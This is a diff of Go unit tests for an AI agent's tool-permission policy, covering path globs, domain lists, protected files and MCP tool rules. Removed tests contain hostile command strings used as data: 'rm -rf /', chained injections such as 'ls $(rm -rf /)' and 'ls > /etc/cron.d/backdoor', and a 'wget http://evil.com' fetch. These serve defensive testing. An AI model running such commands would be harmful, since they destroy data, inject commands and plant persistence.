@@ -1,4 +1,3 @@
-// Package policy provides security policy loading and enforcement.
 package policy
 
 import (
@@ -8,7 +7,6 @@ import (
 	"testing"
 )
 
-// R6.1.1: Load policy.toml from workflow directory
 func TestPolicy_LoadFromFile(t *testing.T) {
 	tmpDir := t.TempDir()
 	policyPath := filepath.Join(tmpDir, "policy.toml")
@@ -16,14 +14,13 @@ func TestPolicy_LoadFromFile(t *testing.T) {
 	content := `
 default_deny = true
 
-[read]
-enabled = true
+[tools.read]
 allow = ["$WORKSPACE/**"]
 deny = ["~/.ssh/*"]
 `
 	os.WriteFile(policyPath, []byte(content), 0644)
 
-	pol, err := LoadFile(policyPath)
+	pol, err := FromFile(policyPath, tmpDir, "/home/user")
 	if err != nil {
 		t.Fatalf("load error: %v", err)
 	}
@@ -32,46 +29,52 @@ deny = ["~/.ssh/*"]
 		t.Error("expected default_deny = true")
 	}
 
-	readPolicy := pol.GetToolPolicy("read")
-	if readPolicy == nil {
-		t.Fatal("expected read policy")
+	if !pol.IsToolEnabled("read") {
+		t.Error("expected read to be enabled")
 	}
-	if !readPolicy.Enabled {
-		t.Error("expected read.enabled = true")
+
+	readPolicy := pol.GetToolPolicy("read")
+	// Patterns should be expanded after FromFile.
+	if readPolicy.Allow[0] != tmpDir+"/**" {
+		t.Errorf("expected expanded allow pattern, got %s", readPolicy.Allow[0])
 	}
 }
 
-// R6.1.3: Apply defaults for missing tool sections
 func TestPolicy_Defaults(t *testing.T) {
 	pol := New()
-
-	// All tools should have default policy
-	readPolicy := pol.GetToolPolicy("read")
-	if readPolicy == nil {
-		t.Fatal("expected default read policy")
+	// DefaultDeny is true, so unconfigured tools are disabled.
+	if pol.IsToolEnabled("read") {
+		t.Error("unconfigured tool should be disabled with default_deny")
+	}
+	// GetToolPolicy returns nil for unconfigured tools.
+	if pol.GetToolPolicy("read") != nil {
+		t.Error("expected nil for unconfigured tool")
 	}
 }
 
-// R6.2.1: Check tool enabled flag before execution
 func TestPolicy_ToolEnabled(t *testing.T) {
-	pol := New()
-	pol.Tools["bash"] = &ToolPolicy{Enabled: false}
+	pol := New() // DefaultDeny = true
+	pol.Tools["read"] = &ToolPolicy{}
 
-	if pol.IsToolEnabled("bash") {
-		t.Error("bash should be disabled")
-	}
-
+	// Listed in [tools] → enabled.
 	if !pol.IsToolEnabled("read") {
-		t.Error("read should be enabled by default")
+		t.Error("listed tool should be enabled")
+	}
+	// Not listed + DefaultDeny → disabled.
+	if pol.IsToolEnabled("glob") {
+		t.Error("unlisted tool should be disabled with default_deny")
+	}
+	// Not listed + DefaultDeny = false → enabled.
+	pol.DefaultDeny = false
+	if !pol.IsToolEnabled("glob") {
+		t.Error("unlisted tool should be enabled without default_deny")
 	}
 }
 
-// R6.2.2: Check global default_deny setting
 func TestPolicy_DefaultDeny(t *testing.T) {
 	pol := New()
 	pol.DefaultDeny = true
 
-	// With default_deny, a path with no matching allow should be blocked
 	allowed, reason := pol.CheckPath("read", "/etc/passwd")
 	if allowed {
 		t.Error("should deny /etc/passwd with default_deny")
@@ -81,79 +84,68 @@ func TestPolicy_DefaultDeny(t *testing.T) {
 	}
 }
 
-// R6.2.3: Evaluate deny patterns (deny wins on match)
 func TestPolicy_DenyPatterns(t *testing.T) {
 	pol := New()
 	pol.Tools["read"] = &ToolPolicy{
-		Enabled: true,
+		
 		Allow:   []string{"**"},
-		Deny:    []string{"~/.ssh/*"},
+		Deny:    []string{"/home/user/.ssh/*"},
 	}
-	pol.HomeDir = "/home/user"
 
 	allowed, _ := pol.CheckPath("read", "/home/user/.ssh/id_rsa")
 	if allowed {
-		t.Error("should deny ~/.ssh/* paths")
+		t.Error("should deny .ssh paths")
 	}
 }
 
-// R6.2.4: Evaluate allow patterns
 func TestPolicy_AllowPatterns(t *testing.T) {
 	pol := New()
-	pol.Workspace = "/workspace"
 	pol.Tools["read"] = &ToolPolicy{
-		Enabled: true,
-		Allow:   []string{"$WORKSPACE/**"},
+		
+		Allow:   []string{"/workspace/**"},
 	}
 
 	allowed, _ := pol.CheckPath("read", "/workspace/src/main.go")
 	if !allowed {
-		t.Error("should allow $WORKSPACE/** paths")
+		t.Error("should allow /workspace/** paths")
 	}
 }
 
-// R6.3.1: Expand $WORKSPACE variable to workspace path
-func TestPolicy_WorkspaceExpansion(t *testing.T) {
-	pol := New()
-	pol.Workspace = "/my/workspace"
-	pol.Tools["write"] = &ToolPolicy{
-		Enabled: true,
-		Allow:   []string{"$WORKSPACE/**"},
+func TestPolicy_PatternExpansion(t *testing.T) {
+	content := `
+[tools.write]
+allow = ["$WORKSPACE/**"]
+
+[tools.read]
+allow = ["~/documents/**"]
+`
+	pol, err := FromTOML(content, "/my/workspace", "/home/testuser")
+	if err != nil {
+		t.Fatalf("parse error: %v", err)
 	}
 
+	// $WORKSPACE should be expanded.
 	allowed, _ := pol.CheckPath("write", "/my/workspace/file.txt")
 	if !allowed {
 		t.Error("should expand $WORKSPACE and allow")
 	}
-
 	allowed, _ = pol.CheckPath("write", "/other/path/file.txt")
 	if allowed {
 		t.Error("should deny paths outside $WORKSPACE")
 	}
-}
 
-// R6.3.2: Expand ~ to user home directory
-func TestPolicy_HomeExpansion(t *testing.T) {
-	pol := New()
-	pol.HomeDir = "/home/testuser"
-	pol.Tools["read"] = &ToolPolicy{
-		Enabled: true,
-		Allow:   []string{"~/documents/**"},
-	}
-
-	allowed, _ := pol.CheckPath("read", "/home/testuser/documents/file.txt")
+	// ~ should be expanded.
+	allowed, _ = pol.CheckPath("read", "/home/testuser/documents/file.txt")
 	if !allowed {
 		t.Error("should expand ~ and allow")
 	}
 }
 
-// R6.3.3: Match paths against glob patterns
 func TestPolicy_GlobPatterns(t *testing.T) {
 	pol := New()
-	pol.Workspace = "/workspace"
 	pol.Tools["read"] = &ToolPolicy{
-		Enabled: true,
-		Allow:   []string{"$WORKSPACE/*.go"},
+		
+		Allow:   []string{"/workspace/*.go"},
 	}
 
 	allowed, _ := pol.CheckPath("read", "/workspace/main.go")
@@ -167,116 +159,30 @@ func TestPolicy_GlobPatterns(t *testing.T) {
 	}
 }
 
-// R6.3.4: Support * (single segment) and ** (recursive)
 func TestPolicy_RecursiveGlob(t *testing.T) {
 	pol := New()
-	pol.Workspace = "/workspace"
 	pol.Tools["read"] = &ToolPolicy{
-		Enabled: true,
-		Allow:   []string{"$WORKSPACE/**"},
+		
+		Allow:   []string{"/workspace/**"},
 	}
 
-	// ** should match any depth
 	allowed, _ := pol.CheckPath("read", "/workspace/a/b/c/d/file.go")
 	if !allowed {
 		t.Error("** should match any depth")
 	}
 
-	// Single * should NOT match across directories
-	pol.Tools["read"].Allow = []string{"$WORKSPACE/*"}
+	pol.Tools["read"].Allow = []string{"/workspace/*"}
 	allowed, _ = pol.CheckPath("read", "/workspace/a/b/file.go")
 	if allowed {
 		t.Error("* should not match across directories")
 	}
 }
 
-// R6.4.1: Check command against denylist first
-func TestPolicy_BashDenylist(t *testing.T) {
-	pol := New()
-	pol.Tools["bash"] = &ToolPolicy{
-		Enabled:   true,
-		Allowlist: []string{"ls *", "cat *"},
-		Denylist:  []string{"rm -rf *", "sudo *"},
-	}
-
-	allowed, _ := pol.CheckCommand("bash", "rm -rf /")
-	if allowed {
-		t.Error("should deny rm -rf")
-	}
-
-	allowed, _ = pol.CheckCommand("bash", "sudo cat /etc/shadow")
-	if allowed {
-		t.Error("should deny sudo commands")
-	}
-}
-
-// R6.4.2: Check command against allowlist
-func TestPolicy_BashAllowlist(t *testing.T) {
-	pol := New()
-	pol.Tools["bash"] = &ToolPolicy{
-		Enabled:   true,
-		Allowlist: []string{"ls *", "cat *", "go test *"},
-	}
-
-	allowed, _ := pol.CheckCommand("bash", "ls -la")
-	if !allowed {
-		t.Error("should allow ls commands")
-	}
-
-	allowed, _ = pol.CheckCommand("bash", "go test ./...")
-	if !allowed {
-		t.Error("should allow go test")
-	}
-}
-
-// R6.4.3: Block if not in allowlist
-func TestPolicy_BashNotInAllowlist(t *testing.T) {
-	pol := New()
-	pol.Tools["bash"] = &ToolPolicy{
-		Enabled:   true,
-		Allowlist: []string{"ls *"},
-	}
-
-	allowed, _ := pol.CheckCommand("bash", "wget http://evil.com")
-	if allowed {
-		t.Error("should block commands not in allowlist")
-	}
-}
-
-// R6.4.4: Block command chaining attacks (shell metacharacters)
-func TestPolicy_BashCommandChaining(t *testing.T) {
-	pol := New()
-	pol.Tools["bash"] = &ToolPolicy{
-		Enabled:   true,
-		Allowlist: []string{"ls *"},
-	}
-
-	// These should all be blocked despite starting with "ls"
-	attacks := []string{
-		"ls && rm -rf /",
-		"ls || rm -rf /",
-		"ls; rm -rf /",
-		"ls | cat /etc/passwd",
-		"ls `rm -rf /`",
-		"ls $(rm -rf /)",
-		"ls > /etc/cron.d/backdoor",
-		"ls\nrm -rf /",
-	}
-
-	for _, cmd := range attacks {
-		allowed, _ := pol.CheckCommand("bash", cmd)
-		if allowed {
-			t.Errorf("should block command chaining attack: %q", cmd)
-		}
-	}
-}
-
-// R6.5.1: Check domain against allow_domains list
 func TestPolicy_WebDomains(t *testing.T) {
 	pol := New()
 	pol.Tools["web_fetch"] = &ToolPolicy{
-		Enabled:      true,
-		AllowDomains: []string{"github.com", "*.google.com"},
+		
+		Allow:   []string{"github.com", "*.google.com"},
 	}
 
 	allowed, _ := pol.CheckDomain("web_fetch", "github.com")
@@ -295,25 +201,8 @@ func TestPolicy_WebDomains(t *testing.T) {
 	}
 }
 
-// R6.5.2: Enforce rate_limit
-func TestPolicy_RateLimit(t *testing.T) {
-	pol := New()
-	pol.Tools["web_fetch"] = &ToolPolicy{
-		Enabled:   true,
-		RateLimit: 10,
-	}
-
-	tp := pol.GetToolPolicy("web_fetch")
-	if tp.RateLimit != 10 {
-		t.Errorf("expected rate limit 10, got %d", tp.RateLimit)
-	}
-}
-
-// R6.6: Protected config files cannot be modified
 func TestPolicy_ProtectedFiles(t *testing.T) {
 	pol := New()
-	pol.ConfigDir = "/workspace"
-	pol.HomeDir = "/home/user"
 
 	tests := []struct {
 		path      string
@@ -327,7 +216,7 @@ func TestPolicy_ProtectedFiles(t *testing.T) {
 		{"/home/user/.config/grid/credentials.toml", true},
 		{"README.md", false},
 		{"/workspace/src/main.go", false},
-		{"/workspace/config.toml", false}, // not a protected name
+		{"/workspace/config.toml", false},
 	}
 
 	for _, tt := range tests {
@@ -338,13 +227,11 @@ func TestPolicy_ProtectedFiles(t *testing.T) {
 	}
 }
 
-// R6.6.1: Write tool blocks protected files
 func TestPolicy_WriteBlocksProtectedFiles(t *testing.T) {
 	pol := New()
-	pol.ConfigDir = "/workspace"
 	pol.Tools["write"] = &ToolPolicy{
-		Enabled: true,
-		Allow:   []string{"**"}, // Allow everything normally
+		
+		Allow:   []string{"**"},
 	}
 
 	allowed, reason := pol.CheckPath("write", "/workspace/agent.toml")
@@ -355,19 +242,16 @@ func TestPolicy_WriteBlocksProtectedFiles(t *testing.T) {
 		t.Error("should have denial reason for protected file")
 	}
 
-	// Normal files should still work
 	allowed, _ = pol.CheckPath("write", "/workspace/src/main.go")
 	if !allowed {
 		t.Error("should allow write to normal files")
 	}
 }
 
-// R6.6.2: Edit tool blocks protected files
 func TestPolicy_EditBlocksProtectedFiles(t *testing.T) {
 	pol := New()
-	pol.ConfigDir = "/workspace"
 	pol.Tools["edit"] = &ToolPolicy{
-		Enabled: true,
+		
 		Allow:   []string{"**"},
 	}
 
@@ -382,36 +266,54 @@ func TestPolicy_EditBlocksProtectedFiles(t *testing.T) {
 	}
 }
 
-// R6.6.3: Symlink bypass protection
 func TestPolicy_SymlinkBypass(t *testing.T) {
 	tmpDir := t.TempDir()
 	pol := New()
-	pol.ConfigDir = tmpDir
-	pol.HomeDir = tmpDir
 
-	// Create a real credentials.toml
 	credPath := filepath.Join(tmpDir, "credentials.toml")
 	os.WriteFile(credPath, []byte("test"), 0600)
 
-	// Create a symlink to it
 	linkPath := filepath.Join(tmpDir, "innocent.txt")
 	os.Symlink(credPath, linkPath)
 
-	// The symlink should be detected as protected
 	if !pol.IsProtectedFile(linkPath) {
 		t.Error("symlink to credentials.toml should be protected")
 	}
-
-	// Direct access should also be protected
 	if !pol.IsProtectedFile(credPath) {
 		t.Error("direct credentials.toml should be protected")
 	}
 }
 
-// R6.7: MCP tool policy
+func TestPolicy_ProtectedFiles_PathEntry(t *testing.T) {
+	tmpDir := t.TempDir()
+	pol := New()
+
+	// Add a path-based entry (as --config / --policy would provide).
+	configPath := filepath.Join(tmpDir, "my-custom-config.toml")
+	os.WriteFile(configPath, []byte("test"), 0600)
+	pol.ProtectedFiles = append(pol.ProtectedFiles, configPath)
+
+	// The exact file should be protected.
+	if !pol.IsProtectedFile(configPath) {
+		t.Error("custom config should be protected via path match")
+	}
+
+	// A different file with the same basename in another dir should NOT match.
+	otherDir := t.TempDir()
+	otherPath := filepath.Join(otherDir, "my-custom-config.toml")
+	os.WriteFile(otherPath, []byte("other"), 0600)
+	if pol.IsProtectedFile(otherPath) {
+		t.Error("same basename in different dir should not match path-based entry")
+	}
+
+	// Default basename entries should still work.
+	if !pol.IsProtectedFile("agent.toml") {
+		t.Error("agent.toml should still be protected via basename match")
+	}
+}
+
 func TestPolicy_MCPToolNotConfigured(t *testing.T) {
 	pol := New()
-	// MCP is nil - should allow but warn
 
 	allowed, _, warning := pol.CheckMCPTool("filesystem", "read_file")
 	if !allowed {
@@ -422,39 +324,49 @@ func TestPolicy_MCPToolNotConfigured(t *testing.T) {
 	}
 }
 
-func TestPolicy_MCPToolDefaultDenyFalse(t *testing.T) {
+func TestPolicy_MCPToolEnabled(t *testing.T) {
 	pol := New()
-	pol.MCP = &MCPPolicy{DefaultDeny: false}
+	pol.MCP = &MCPPolicy{Enabled: true}
 
 	allowed, _, warning := pol.CheckMCPTool("filesystem", "read_file")
 	if !allowed {
-		t.Error("should allow when default_deny is false")
+		t.Error("should allow when enabled with no allow list")
 	}
 	if warning != "" {
 		t.Error("should not warn when policy is configured")
 	}
 }
 
-func TestPolicy_MCPToolDefaultDenyTrue(t *testing.T) {
+func TestPolicy_MCPToolDisabled(t *testing.T) {
+	pol := New()
+	pol.MCP = &MCPPolicy{Enabled: false}
+
+	allowed, reason, _ := pol.CheckMCPTool("filesystem", "read_file")
+	if allowed {
+		t.Error("should deny when MCP is disabled")
+	}
+	if reason == "" {
+		t.Error("should have denial reason")
+	}
+}
+
+func TestPolicy_MCPToolWithAllowList(t *testing.T) {
 	pol := New()
 	pol.MCP = &MCPPolicy{
-		DefaultDeny:  true,
-		AllowedTools: []string{"filesystem:read_file", "memory:*"},
+		Enabled: true,
+		Allow:   []string{"filesystem:read_file", "memory:*"},
 	}
 
-	// Explicitly allowed tool
 	allowed, _, _ := pol.CheckMCPTool("filesystem", "read_file")
 	if !allowed {
 		t.Error("should allow filesystem:read_file")
 	}
 
-	// Wildcard pattern
 	allowed, _, _ = pol.CheckMCPTool("memory", "store")
 	if !allowed {
 		t.Error("should allow memory:* pattern")
 	}
 
-	// Not in allowlist
 	allowed, reason, _ := pol.CheckMCPTool("filesystem", "write_file")
 	if allowed {
 		t.Error("should deny filesystem:write_file")
@@ -464,78 +376,15 @@ func TestPolicy_MCPToolDefaultDenyTrue(t *testing.T) {
 	}
 }
 
-// ValidateKeys tests
-func TestValidateKeys_WorkspaceRejected(t *testing.T) {
-	content := `
-workspace = "/some/path"
-default_deny = true
-`
-	err := ValidateKeys(content)
-	if err == nil {
-		t.Fatal("expected error for workspace in policy")
-	}
-	if !strings.Contains(err.Error(), "workspace does not belong in policy files") {
-		t.Errorf("unexpected error: %v", err)
-	}
-}
-
-func TestValidateKeys_UnknownScalarKey(t *testing.T) {
-	content := `
-default_deny = true
-bogus_key = "wat"
-`
-	err := ValidateKeys(content)
-	if err == nil {
-		t.Fatal("expected error for unknown key")
-	}
-	if !strings.Contains(err.Error(), "bogus_key") {
-		t.Errorf("expected error to mention bogus_key: %v", err)
-	}
-}
-
-func TestValidateKeys_ValidPolicy(t *testing.T) {
-	content := `
-default_deny = true
-
-[mcp]
-default_deny = true
-
-[security]
-extra_keywords = ["secret"]
-
-[bash]
-enabled = true
-allowlist = ["ls *"]
-`
-	err := ValidateKeys(content)
-	if err != nil {
-		t.Fatalf("expected valid policy, got: %v", err)
-	}
-}
-
-func TestValidateKeys_ToolSectionsAllowed(t *testing.T) {
-	content := `
-[read]
-enabled = true
-
-[write]
-enabled = false
-`
-	err := ValidateKeys(content)
-	if err != nil {
-		t.Fatalf("tool sections should be allowed: %v", err)
-	}
-}
-
 func TestPolicy_MCPToolParsing(t *testing.T) {
 	content := `
 default_deny = true
 
 [mcp]
-default_deny = true
-allowed_tools = ["filesystem:read_file", "memory:*"]
+enabled = true
+allow = ["filesystem:read_file", "memory:*"]
 `
-	pol, err := Parse(content)
+	pol, err := FromTOML(content, "", "")
 	if err != nil {
 		t.Fatalf("parse error: %v", err)
 	}
@@ -543,44 +392,53 @@ allowed_tools = ["filesystem:read_file", "memory:*"]
 	if pol.MCP == nil {
 		t.Fatal("expected MCP policy to be parsed")
 	}
-	if !pol.MCP.DefaultDeny {
-		t.Error("expected MCP default_deny = true")
+	if !pol.MCP.Enabled {
+		t.Error("expected MCP enabled = true")
 	}
-	if len(pol.MCP.AllowedTools) != 2 {
-		t.Errorf("expected 2 allowed tools, got %d", len(pol.MCP.AllowedTools))
+	if len(pol.MCP.Allow) != 2 {
+		t.Errorf("expected 2 allowed tools, got %d", len(pol.MCP.Allow))
 	}
 }
 
-func TestPolicy_AllowedDirs_Parse(t *testing.T) {
+func TestParse_UnknownKeysIgnored(t *testing.T) {
+	content := `
+default_deny = true
+bogus_key = "wat"
+workspace = "/some/path"
+`
+	pol, err := FromTOML(content, "", "")
+	if err != nil {
+		t.Fatalf("expected unknown keys to be ignored, got: %v", err)
+	}
+	if !pol.DefaultDeny {
+		t.Error("expected default_deny = true")
+	}
+}
+
+func TestPolicy_AllowedDirs_FromTOML(t *testing.T) {
 	content := `
 default_deny = false
 allowed_dirs = ["/workspace", "/tmp"]
 
-[read]
-enabled = true
+[tools.read]
 `
-	pol, err := Parse(content)
+	pol, err := FromTOML(content, "", "")
 	if err != nil {
 		t.Fatalf("parse error: %v", err)
 	}
 	if len(pol.AllowedDirs) != 2 {
 		t.Fatalf("expected 2 allowed_dirs, got %d", len(pol.AllowedDirs))
 	}
-	if pol.AllowedDirs[0] != "/workspace" || pol.AllowedDirs[1] != "/tmp" {
-		t.Errorf("unexpected allowed_dirs: %v", pol.AllowedDirs)
-	}
 }
 
 func TestPolicy_AllowedDirs_CheckPath(t *testing.T) {
 	pol := &Policy{
 		AllowedDirs: []string{"/workspace", "/tmp"},
-		Workspace:   "/workspace",
 		Tools:       make(map[string]*ToolPolicy),
 	}
-	pol.Tools["read"] = &ToolPolicy{Enabled: true}
-	pol.Tools["write"] = &ToolPolicy{Enabled: true}
+	pol.Tools["read"] = &ToolPolicy{}
+	pol.Tools["write"] = &ToolPolicy{}
 
-	// Within allowed dirs
 	ok, _ := pol.CheckPath("read", "/workspace/file.txt")
 	if !ok {
 		t.Error("expected /workspace/file.txt to be allowed")
@@ -591,7 +449,6 @@ func TestPolicy_AllowedDirs_CheckPath(t *testing.T) {
 		t.Error("expected /tmp/data.json to be allowed")
 	}
 
-	// Outside allowed dirs
 	ok, reason := pol.CheckPath("read", "/etc/passwd")
 	if ok {
 		t.Error("expected /etc/passwd to be denied")
@@ -599,20 +456,18 @@ func TestPolicy_AllowedDirs_CheckPath(t *testing.T) {
 	if !strings.Contains(reason, "outside allowed directories") {
 		t.Errorf("expected 'outside allowed directories' reason, got: %s", reason)
 	}
-
-	ok, _ = pol.CheckPath("write", "/root/.ssh/id_rsa")
-	if ok {
-		t.Error("expected /root/.ssh/id_rsa to be denied")
-	}
 }
 
-func TestPolicy_AllowedDirs_WithWorkspaceExpansion(t *testing.T) {
-	pol := &Policy{
-		AllowedDirs: []string{"$WORKSPACE", "/tmp"},
-		Workspace:   "/home/user/project",
-		Tools:       make(map[string]*ToolPolicy),
+func TestPolicy_AllowedDirs_WithExpansion(t *testing.T) {
+	content := `
+allowed_dirs = ["$WORKSPACE", "/tmp"]
+
+[tools.read]
+`
+	pol, err := FromTOML(content, "/home/user/project", "")
+	if err != nil {
+		t.Fatalf("parse error: %v", err)
 	}
-	pol.Tools["read"] = &ToolPolicy{Enabled: true}
 
 	ok, _ := pol.CheckPath("read", "/home/user/project/src/main.go")
 	if !ok {
@@ -627,13 +482,11 @@ func TestPolicy_AllowedDirs_WithWorkspaceExpansion(t *testing.T) {
 
 func TestPolicy_AllowedDirs_Empty_NoRestriction(t *testing.T) {
 	pol := &Policy{
-		AllowedDirs: nil, // No restriction
-		Workspace:   "/workspace",
+		AllowedDirs: nil,
 		Tools:       make(map[string]*ToolPolicy),
 	}
-	pol.Tools["read"] = &ToolPolicy{Enabled: true}
+	pol.Tools["read"] = &ToolPolicy{}
 
-	// With no allowed_dirs, any path should pass the allowed_dirs check
 	ok, _ := pol.CheckPath("read", "/etc/passwd")
 	if !ok {
 		t.Error("with no allowed_dirs, paths should not be restricted by directory")
@@ -641,39 +494,169 @@ func TestPolicy_AllowedDirs_Empty_NoRestriction(t *testing.T) {
 }
 
 func TestPolicy_GetAllowedDirs(t *testing.T) {
-	// With explicit allowed_dirs
 	pol := &Policy{
-		AllowedDirs: []string{"$WORKSPACE", "/tmp"},
-		Workspace:   "/myproject",
+		AllowedDirs: []string{"/workspace", "/tmp"},
 	}
 	dirs := pol.GetAllowedDirs()
-	if len(dirs) != 2 || dirs[0] != "/myproject" || dirs[1] != "/tmp" {
-		t.Errorf("expected [/myproject, /tmp], got %v", dirs)
+	if len(dirs) != 2 || dirs[0] != "/workspace" || dirs[1] != "/tmp" {
+		t.Errorf("expected [/workspace, /tmp], got %v", dirs)
 	}
 
-	// Fallback to workspace
-	pol2 := &Policy{Workspace: "/fallback"}
+	// Empty
+	pol2 := &Policy{}
 	dirs2 := pol2.GetAllowedDirs()
-	if len(dirs2) != 1 || dirs2[0] != "/fallback" {
-		t.Errorf("expected [/fallback], got %v", dirs2)
-	}
-
-	// No workspace either
-	pol3 := &Policy{}
-	dirs3 := pol3.GetAllowedDirs()
-	if dirs3 != nil {
-		t.Errorf("expected nil, got %v", dirs3)
+	if dirs2 != nil {
+		t.Errorf("expected nil, got %v", dirs2)
 	}
 }
 
-func TestPolicy_AllowedDirs_ValidateKeys(t *testing.T) {
-	// allowed_dirs should be a recognized top-level key
+func TestParse_AllowedDirs(t *testing.T) {
 	content := `
 default_deny = false
 allowed_dirs = ["/workspace"]
 `
-	err := ValidateKeys(content)
+	pol, err := FromTOML(content, "", "")
 	if err != nil {
-		t.Errorf("allowed_dirs should be a valid top-level key: %v", err)
+		t.Fatalf("parse error: %v", err)
+	}
+	if len(pol.AllowedDirs) != 1 || pol.AllowedDirs[0] != "/workspace" {
+		t.Errorf("expected allowed_dirs [/workspace], got %v", pol.AllowedDirs)
+	}
+}
+
+// Error paths
+
+func TestFromFile_NonexistentFile(t *testing.T) {
+	_, err := FromFile("/nonexistent/policy.toml", "", "")
+	if err == nil {
+		t.Error("expected error for nonexistent file")
+	}
+}
+
+func TestFromTOML_InvalidTOML(t *testing.T) {
+	_, err := FromTOML("[broken", "", "")
+	if err == nil {
+		t.Error("expected error for invalid TOML")
+	}
+}
+
+// Nil policy safety
+
+func TestGetToolPolicy_NilPolicy(t *testing.T) {
+	var p *Policy
+	tp := p.GetToolPolicy("read")
+	if tp != nil {
+		t.Error("expected nil from nil policy")
+	}
+}
+
+func TestIsToolEnabled_NilPolicy(t *testing.T) {
+	var p *Policy
+	if !p.IsToolEnabled("read") {
+		t.Error("nil policy should allow all tools")
+	}
+}
+
+// CheckPath edge cases
+
+func TestCheckPath_EnabledByDefaultDenyFalse_NoToolConfig(t *testing.T) {
+	pol := New()
+	pol.DefaultDeny = false
+	// "read" not in Tools map, but DefaultDeny=false → enabled, no restrictions.
+	ok, _ := pol.CheckPath("read", "/any/path")
+	if !ok {
+		t.Error("expected path allowed when tool enabled with no restrictions")
+	}
+}
+
+func TestCheckPath_DisabledTool(t *testing.T) {
+	pol := New() // DefaultDeny = true
+	// "read" not in Tools → disabled.
+	ok, reason := pol.CheckPath("read", "/any/path")
+	if ok {
+		t.Error("expected path denied for disabled tool")
+	}
+	if reason == "" {
+		t.Error("expected denial reason")
+	}
+}
+
+// CheckDomain edge cases
+
+func TestCheckDomain_DisabledTool(t *testing.T) {
+	pol := New() // DefaultDeny = true
+	ok, reason := pol.CheckDomain("web_fetch", "github.com")
+	if ok {
+		t.Error("expected domain denied for disabled tool")
+	}
+	if reason == "" {
+		t.Error("expected denial reason")
+	}
+}
+
+func TestCheckDomain_EnabledNoConfig(t *testing.T) {
+	pol := New()
+	pol.DefaultDeny = false
+	// web_fetch not in Tools, but DefaultDeny=false → enabled, no restrictions.
+	ok, _ := pol.CheckDomain("web_fetch", "anything.com")
+	if !ok {
+		t.Error("expected domain allowed when no restrictions configured")
+	}
+}
+
+func TestCheckDomain_WildcardAll(t *testing.T) {
+	pol := New()
+	pol.Tools["web_fetch"] = &ToolPolicy{
+		Allow: []string{"*"},
+	}
+	ok, _ := pol.CheckDomain("web_fetch", "anything.com")
+	if !ok {
+		t.Error("expected * to allow all domains")
+	}
+}
+
+// matchMCPTool edge cases
+
+func TestCheckMCPTool_MalformedPattern(t *testing.T) {
+	pol := New()
+	pol.MCP = &MCPPolicy{
+		Enabled: true,
+		Allow:   []string{"no-colon-pattern"},
+	}
+	// "no-colon-pattern" doesn't match "server:tool" format.
+	ok, _, _ := pol.CheckMCPTool("server", "tool")
+	if ok {
+		t.Error("expected malformed pattern to not match")
+	}
+}
+
+// matchPath edge cases
+
+func TestCheckPath_RecursiveGlobWithSuffix(t *testing.T) {
+	pol := New()
+	pol.Tools["read"] = &ToolPolicy{
+		Allow: []string{"/workspace/**/*.go"},
+	}
+
+	ok, _ := pol.CheckPath("read", "/workspace/src/main.go")
+	if !ok {
+		t.Error("expected **/*.go to match nested .go file")
+	}
+
+	ok, _ = pol.CheckPath("read", "/workspace/src/main.txt")
+	if ok {
+		t.Error("expected **/*.go to not match .txt file")
+	}
+}
+
+func TestCheckPath_RecursiveGlobSuffixInPath(t *testing.T) {
+	pol := New()
+	pol.Tools["read"] = &ToolPolicy{
+		Allow: []string{"/workspace/**/test"},
+	}
+
+	ok, _ := pol.CheckPath("read", "/workspace/a/b/test")
+	if !ok {
+		t.Error("expected **/test to match nested path ending in test")
 	}
 }
